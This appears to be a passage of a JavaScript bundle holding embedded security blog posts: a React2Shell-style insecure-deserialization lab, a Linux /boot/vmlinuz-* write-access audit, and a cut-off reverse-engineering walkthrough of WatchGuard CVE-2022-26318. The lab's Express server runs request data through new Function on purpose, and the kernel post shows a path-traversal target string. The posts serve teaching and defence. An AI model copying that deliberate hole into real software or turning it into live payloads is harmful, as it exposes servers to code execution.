<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,Wm=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,Vm=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,$m=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
